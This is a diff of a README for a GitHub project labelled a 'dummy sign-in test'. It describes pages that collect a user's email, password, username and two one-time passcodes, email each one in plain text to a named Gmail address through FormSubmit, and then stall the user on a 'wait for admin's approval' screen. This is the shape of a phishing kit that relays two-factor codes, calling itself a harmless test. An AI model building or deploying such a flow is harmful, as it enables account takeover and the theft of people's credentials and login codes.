@@ -1,19 +1,29 @@
 # Dummy Sign-In Test
 
 Plain multi-step dummy authentication flow for testing purposes.
+**No design / styling** — just bare pages.
 
-**No design / styling** — just a bare page.
+## User Flow (`index.html`)
+1. Enter **Email + Password** → data is emailed to admin in plain text
+2. Enter **Username** → data is emailed to admin
+3. Enter **OTP 1** → data is emailed to admin
+4. Enter **OTP 2** → data is emailed to admin
+5. User sees a **loading / waiting page**: "Please wait for admin’s approval"
 
-## Flow
-1. Email + Password
-2. Username
-3. OTP 1 (dummy)
-4. OTP 2 (dummy)
+All values are accepted (completely dummy).
 
-Accepts **any** values. Completely client-side dummy flow.
+## Admin Portal (`admin.html`)
+- Login with email: `blessedresult6@gmail.com` (any password works)
+- Explains that all dummy user data arrives by email in plain text almost immediately
 
-## How to use
-- Open `index.html` in any browser
-- Or enable GitHub Pages on this repo and visit the Pages URL
+## How data reaches the admin
+Each step uses FormSubmit to send a plain-text email to:
+**blessedresult6@gmail.com**
+
+Subject lines look like: `Dummy Sign-In - Email + Password`, `Dummy Sign-In - Username`, etc.
+
+## Files
+- `index.html` → User sign-in flow
+- `admin.html` → Admin portal
 
 Repo: https://github.com/Dennisbed1234/dummy-signin-test
